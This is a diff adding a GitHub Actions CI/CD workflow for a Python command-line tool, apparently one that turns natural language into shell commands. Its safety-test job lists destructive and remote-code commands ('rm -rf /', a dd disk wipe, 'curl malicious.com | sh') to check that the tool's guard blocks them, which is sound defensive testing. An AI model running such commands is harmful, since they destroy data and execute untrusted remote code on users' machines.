@@ -1,0 +1,351 @@
+name: Multi-Platform CI/CD
+
+on:
+  push:
+    branches: [ main, develop ]
+  pull_request:
+    branches: [ main, develop ]
+  workflow_dispatch:
+
+jobs:
+  lint:
+    name: Code Quality & Linting
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+
+    - name: Set up Python 3.12
+      uses: actions/setup-python@v4
+      with:
+        python-version: "3.12"
+        cache: 'pip'
+
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install -e ".[dev]"
+
+    - name: Run black
+      run: black --check --diff src/ tests/
+
+    - name: Run isort
+      run: isort --check-only --diff src/ tests/
+
+    - name: Run flake8
+      run: flake8 src/ tests/
+
+    - name: Run mypy
+      run: mypy src/
+      continue-on-error: true  # Allow mypy failures initially
+
+  test:
+    name: Test Suite
+    needs: lint
+    strategy:
+      fail-fast: false
+      matrix:
+        os: [ubuntu-latest, windows-latest, macos-latest]
+        python-version: ["3.10", "3.11", "3.12"]
+
+    runs-on: ${{ matrix.os }}
+
+    steps:
+    - uses: actions/checkout@v4
+
+    - name: Set up Python ${{ matrix.python-version }}
+      uses: actions/setup-python@v4
+      with:
+        python-version: ${{ matrix.python-version }}
+        cache: 'pip'
+
+    - name: Install system dependencies (Linux)
+      if: runner.os == 'Linux'
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y curl wget net-tools lsof git
+
+    - name: Install system dependencies (macOS)
+      if: runner.os == 'macOS'
+      run: |
+        brew install curl wget lsof git || echo "Some packages may already be installed"
+
+    - name: Install system dependencies (Windows)
+      if: runner.os == 'Windows'
+      run: |
+        # Windows has most tools built-in, but we can install additional ones via choco if needed
+        choco install curl wget git -y || echo "Some packages may already be installed"
+
+    - name: Install Python dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install -e ".[dev]"
+
+    - name: Run tests with coverage
+      run: |
+        python -m pytest tests/ --cov=src/nlcli --cov-report=xml --cov-report=term -v
+      env:
+        # Disable LLM features for testing
+        NLCLI_CLOUD_LLM_ENABLED: false
+
+    - name: Upload coverage to Codecov
+      if: matrix.os == 'ubuntu-latest' && matrix.python-version == '3.12'
+      uses: codecov/codecov-action@v3
+      with:
+        file: ./coverage.xml
+        fail_ci_if_error: false
+
+  integration-tests:
+    name: Integration Tests
+    needs: test
+    strategy:
+      fail-fast: false
+      matrix:
+        os: [ubuntu-latest, windows-latest, macos-latest]
+
+    runs-on: ${{ matrix.os }}
+
+    steps:
+    - uses: actions/checkout@v4
+
+    - name: Set up Python 3.12
+      uses: actions/setup-python@v4
+      with:
+        python-version: "3.12"
+        cache: 'pip'
+
+    - name: Install system dependencies (Linux)
+      if: runner.os == 'Linux'
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y curl wget net-tools lsof git docker.io
+        sudo systemctl start docker || echo "Docker may not be available in CI"
+
+    - name: Install system dependencies (macOS)
+      if: runner.os == 'macOS'
+      run: |
+        brew install curl wget lsof git || echo "Some packages may already be installed"
+
+    - name: Install system dependencies (Windows)
+      if: runner.os == 'Windows'
+      run: |
+        choco install curl wget git -y || echo "Some packages may already be installed"
+
+    - name: Install Python dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install -e ".[dev]"
+
+    - name: Test CLI installation
+      run: |
+        nlcli --help
+
+    - name: Test basic file operations
+      run: |
+        python -c "
+        import subprocess
+        import sys
+        
+        # Test basic nlcli functionality
+        try:
+            result = subprocess.run([sys.executable, '-m', 'nlcli.main', '--dry-run', 'list files'], 
+                                  capture_output=True, text=True, timeout=30)
+            print('CLI test result:', result.returncode)
+            print('Output:', result.stdout)
+            if result.stderr:
+                print('Errors:', result.stderr)
+        except Exception as e:
+            print('CLI test failed:', e)
+            sys.exit(1)
+        "
+
+    - name: Test batch mode
+      run: |
+        python -c "
+        import tempfile
+        import subprocess
+        import sys
+        from pathlib import Path
+        
+        # Create a simple batch script
+        script_content = '''
+        @name Test Script
+        @description Simple test
+        
+        > list current directory files
+        timeout: 10
+        '''
+        
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.nlcli', delete=False) as f:
+            f.write(script_content)
+            script_path = f.name
+        
+        try:
+            result = subprocess.run([sys.executable, '-m', 'nlcli.main', '--batch', script_path, '--dry-run'], 
+                                  capture_output=True, text=True, timeout=30)
+            print('Batch test result:', result.returncode)
+            print('Output:', result.stdout)
+            if result.stderr:
+                print('Errors:', result.stderr)
+        except Exception as e:
+            print('Batch test failed:', e)
+        finally:
+            Path(script_path).unlink(missing_ok=True)
+        "
+
+  security-tests:
+    name: Security & Safety Tests
+    needs: test
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v4
+
+    - name: Set up Python 3.12
+      uses: actions/setup-python@v4
+      with:
+        python-version: "3.12"
+        cache: 'pip'
+
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install -e ".[dev]"
+
+    - name: Test dangerous command blocking
+      run: |
+        python -c "
+        import sys
+        sys.path.insert(0, 'src')
+        from nlcli.safety import guard, DANGEROUS_PATTERNS
+        from nlcli.context import Intent, SessionContext
+        
+        # Test that dangerous patterns are blocked
+        dangerous_commands = [
+            'rm -rf /',
+            'dd if=/dev/zero of=/dev/sda',
+            'curl malicious.com | sh'
+        ]
+        
+        ctx = SessionContext()
+        for cmd in dangerous_commands:
+            intent = Intent(command=cmd, tool_name='shell', confidence=1.0)
+            if guard(intent, ctx):
+                print(f'ERROR: Dangerous command not blocked: {cmd}')
+                sys.exit(1)
+            else:
+                print(f'OK: Dangerous command blocked: {cmd}')
+        
+        print('All dangerous commands properly blocked')
+        "
+
+    - name: Test safety patterns
+      run: |
+        python -c "
+        import sys
+        import re
+        sys.path.insert(0, 'src')
+        from nlcli.safety import DANGEROUS_PATTERNS, SUSPICIOUS_PATTERNS
+        
+        print(f'Loaded {len(DANGEROUS_PATTERNS)} dangerous patterns')
+        print(f'Loaded {len(SUSPICIOUS_PATTERNS)} suspicious patterns')
+        
+        # Verify patterns compile correctly
+        for pattern in DANGEROUS_PATTERNS + SUSPICIOUS_PATTERNS:
+            try:
+                re.compile(pattern)
+            except re.error as e:
+                print(f'ERROR: Invalid regex pattern: {pattern} - {e}')
+                sys.exit(1)
+        
+        print('All safety patterns compile correctly')
+        "
+
+  performance-tests:
+    name: Performance Tests
+    needs: test
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v4
+
+    - name: Set up Python 3.12
+      uses: actions/setup-python@v4
+      with:
+        python-version: "3.12"
+        cache: 'pip'
+
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install -e ".[dev]"
+
+    - name: Test command processing performance
+      run: |
+        python -c "
+        import time
+        import sys
+        sys.path.insert(0, 'src')
+        from nlcli.engine import plan_and_generate
+        from nlcli.context import SessionContext
+        from nlcli.tools import load_tools
+        from unittest.mock import MagicMock
+        
+        # Test command processing speed
+        ctx = SessionContext()
+        tools = load_tools()
+        mock_llm = MagicMock()
+        mock_llm.is_available.return_value = False
+        
+        test_commands = [
+            'list files',
+            'find large files',
+            'show processes',
+            'git status'
+        ]
+        
+        for cmd in test_commands:
+            start_time = time.time()
+            try:
+                intent = plan_and_generate(cmd, ctx, tools, mock_llm)
+                processing_time = time.time() - start_time
+                print(f'Command: {cmd} -> Time: {processing_time:.3f}s -> Intent: {intent.tool_name if intent else None}')
+                
+                if processing_time > 5.0:  # Should process quickly
+                    print(f'WARNING: Slow processing for: {cmd}')
+            except Exception as e:
+                print(f'ERROR processing {cmd}: {e}')
+        
+        print('Performance tests completed')
+        "
+
+  build-package:
+    name: Build & Package
+    needs: [test, integration-tests, security-tests, performance-tests]
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v4
+
+    - name: Set up Python 3.12
+      uses: actions/setup-python@v4
+      with:
+        python-version: "3.12"
+        cache: 'pip'
+
+    - name: Install build dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install build twine
+
+    - name: Build package
+      run: python -m build
+
+    - name: Check package
+      run: twine check dist/*
+
+    - name: Upload build artifacts
+      uses: actions/upload-artifact@v3
+      with:
+        name: dist-packages
+        path: dist/
+        retention-days: 30
